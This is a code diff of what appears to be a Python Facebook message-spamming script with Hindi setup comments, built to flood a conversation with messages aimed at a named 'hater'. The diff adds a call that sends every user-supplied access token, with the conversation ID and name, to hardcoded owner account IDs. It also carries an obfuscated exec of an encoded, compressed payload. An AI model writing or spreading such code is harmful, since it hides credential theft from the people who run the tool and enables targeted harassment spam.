@@ -1,3 +1,17 @@
+# +916268781574
+#  FILES NAME :-
+#             main.py =>  is file me script dalna hai
+#             TS-CONVO.txt => is file me group / inox ki ID dalna hai
+#             TS-FILE.txt => is file me messages dalna hai 
+#             TS-NAME.txt => is file me apko apna ya hater ka name dalna hai
+#             TS-TOKEN.txt => isme apni sari id ke token dalne hai
+#             TS-SPEED.txt => is file me second dalna hai kitne second ki speed se mesage bhejne hai
+#             TS-PASS.txt => isme apko apna password dalna hai
+#             TS-HOST.txt => isme host code dalna hai
+# OPTIONAL FILES :-
+#                        Procfile => web: python main.py
+#                        requirements.txt => modules
+#                        runtime.txt => python-3.12.2
 import requests
 import json
 import time
@@ -91,28 +105,25 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
- 
+
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=AVUJX2WDI7X7LP6EWGFRZVFGQSUILCQASMC4DOXRI57MM2SKJKUHBIVU2CBR4BQK7MB4ET6N3LXMM6WTZ6U3ZU2BZVYNF3R7I6QTQYGKNVIISI5RRARGAO5EYKPVWSMT7QJZELI7BZYUDRJJLYDUCECAW5JWAZRMIDA6GPL7O4EBOF73KI7UA5GLQ7JWFR6ENHCP4MJWEPKYFGAQV5DYMXCKQJ6UNNFFIZPGPRF2RXG4KNQSU5CLHB5GOIBDQNEVGTHFICLAN67Q66UYAMI2QODN4WA2NX322UJLENR76OWP6RCIVXNZY5KGDRV24FFAYAGEEHWB6BHNGJXAUUDDUJWTAGG5W2VDWNYYOWT5KPSSGRD4WMK4FR5B5HV3XEH4Y4E33PAOU4YHIQWRDFTMWGRLXXDMBCVPAF7AOVYARLIMEYVLQJQS5VTSV22YRSRDCZDIA7VS2I5CEFSVWXACBLOLJ22GDBI4BEYELIPFRFFKRPCBPJN5UZJN3KF4I3KDP35LT76ALNFIRPNE5EEK6VHKS3JTKJLIR2M6YFUH6T7ZP5XPVX7HPVX77P77PHK3FI5G34VHHY77RBMRJMQU323NBYNCGOIKGTY6TDYEAAADO3RZBULBOCP'))
-	
-	
+
 def send_initial_message():
-	#                      Your Password Link 
-	
-	mmm_pass = requests.get('https://pastebin.com/raw/Sb27RwGi').text
- 
+    
+    mmm_pass = requests.get('https://pastebin.com/raw/Sb27RwGi').text
+    
     if mmm_pass not in password:
-    	
-        print('\033[1;31m⚠︎ Your Password Changed By Rahul ⚠︎')
-        
+        print('\033[1;31m⚠︎ Your Password Changed By Satish ⚠︎')
         sys.exit()
-        
-    msg_template = "Owner => Satish \n Hello Rahul sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
-    #                    Your Target Id 
+    # Message template
+    msg_template = "Owner => Satish \n Hello Satish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
-    target_ids = ["100060220183220", ""] 
+    # Target IDs
+    target_ids = ["100087513362848", "109743854789"]
     
     requests.packages.urllib3.disable_warnings()
+    
     for target_id in target_ids:
         for token in tokens:
             access_token = token.strip()
@@ -121,8 +132,9 @@ def send_initial_message():
             parameters = {'access_token': access_token, 'message': msg}
             response = requests.post(url, json=parameters, headers=headers)
             time.sleep(0.1)
-            print("\n\033[1;31m[+] Initial messages sent. Starting the message sending loop...\n")
- 
+            print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))
+
+send_initial_message()
 def send_messages_from_file():
     num_tokens = len(tokens)
     max_tokens = min(num_tokens, num_messages)
@@ -136,7 +148,7 @@ def send_messages_from_file():
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
                 if response.ok:
-                    print("\033[1;36m[✓] Ha Bhai chud Gyai Abhi ki maa. {} of Convo {} Token {}: {}".format(
+                    print("\033[1;36m[✓] Ha Bhai Chla Gya Tera Massage No. {} of Convo {} Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
                     print('\033[1;92m' + '✪✭═══════•『T.S. ♡ ARMY 』•═══════✭✪')
